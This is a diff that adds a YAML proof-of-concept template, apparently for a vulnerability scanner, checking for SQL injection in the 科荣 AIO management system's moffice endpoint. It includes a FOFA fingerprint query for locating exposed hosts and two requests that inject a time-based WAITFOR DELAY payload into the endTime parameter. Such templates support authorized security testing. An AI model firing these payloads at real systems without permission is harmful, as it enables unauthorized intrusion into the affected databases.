@@ -1,0 +1,43 @@
+id: poc-yaml-koron-aio-moffice-sqli
+info:
+  name: 科荣 AIO管理系统 moffice SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 科荣 AIO 管理系统
+  fofa: body="changeAccount('8000')"
+variables:
+  t1: random_int(3,5)
+  t2: t1*2
+  t3: t2 + 2
+  t4: random_int(1,3)
+  t5: t4*2
+  t6: t5 + 2
+requests:
+- method: GET
+  path: /moffice?op=showWorkPlanList&type=1&beginTime=1&endTime=1';WAITFOR+DELAY+'0:0:{{.t1}}'--+&sid=1
+  expression: 'status_code == 200 &&
+
+    duration >= t2 &&
+
+    duration <= t3 &&
+
+    contains(body,"\"code\":-1") &&
+
+    !contains(body,"<")
+
+    '
+- method: GET
+  path: /moffice?op=showWorkPlanList&type=1&beginTime=1&endTime=1';WAITFOR+DELAY+'0:0:{{.t4}}'--+&sid=1
+  expression: 'status_code == 200 &&
+
+    duration >= t5 &&
+
+    duration <= t6 &&
+
+    contains(body,"\"code\":-1") &&
+
+    !contains(body,"<")
+
+    '
+transport: http
